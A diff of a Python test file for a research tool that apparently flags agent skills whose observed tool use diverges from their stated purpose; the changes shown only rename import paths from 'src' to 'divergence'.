@@ -7,14 +7,14 @@ import json
 
 import numpy as np
 
-from src.calibration.logistic_calibrator import LogisticCalibrator
-from src.evaluation.metrics import group_bootstrap_ci, mcnemar_test, point_metrics
+from divergence.calibration.logistic_calibrator import LogisticCalibrator
+from divergence.evaluation.metrics import group_bootstrap_ci, mcnemar_test, point_metrics
 from agentmesh.governance.audit import AuditLog
 
-from src.evaluator.agt_adapter import (agt_visible, check_parity, from_agt_audit_log, record_trial,
+from divergence.evaluator.agt_adapter import (agt_visible, check_parity, from_agt_audit_log, record_trial,
                                       to_divergence_trace)
-from src.preprocessing.normalise_trace import normalise
-from src.evaluator.divergence_evaluator import DivergenceEvaluator
+from divergence.preprocessing.normalise_trace import normalise
+from divergence.evaluator.divergence_evaluator import DivergenceEvaluator
 
 DESC = "Formats markdown tables in local files."
 EXFIL = [{"seq": 0, "step": 0, "source": "tool", "tool": "bash", "action": "command",
@@ -153,7 +153,7 @@ def test_point_metrics_and_bootstrap():
 
 def test_result_object_shape():
     """The original stub test, kept: the v8 four-field shape still constructs on its own."""
-    from src.evaluator.divergence_evaluator import DivergenceResult
+    from divergence.evaluator.divergence_evaluator import DivergenceResult
     result = DivergenceResult(consistency_score=0.31, structural_flags=["flag_unmentioned_domain"],
                               verdict="FLAG", reasoning="Low semantic alignment between stated purpose and observed behaviour.")
     assert 0.0 <= result.consistency_score <= 1.0
@@ -162,8 +162,8 @@ def test_result_object_shape():
 
 def test_skill_level_is_flag_if_any_and_max_score():
     import pandas as pd
-    from src.experiments.exp1_baseline_comparison import ROLES
-    from src.experiments.exp1b_skill_level import skill_predictions
+    from divergence.experiments.exp1_baseline_comparison import ROLES
+    from divergence.experiments.exp1b_skill_level import skill_predictions
     rows = [("malware/a", "direct", 1, 0.9, 1), ("malware/a", "agent", 0, 0.2, 0), ("benign/b", "instructed", 0, 0.1, 0)]
     preds = pd.DataFrame([{"sample_id": s, "mode": m, "group": s, "label": y, "dataset_label": int(s[0] == "m"),
                            **{f"{n}|score": sc for n in ROLES}, **{f"{n}|verdict": v for n in ROLES}}
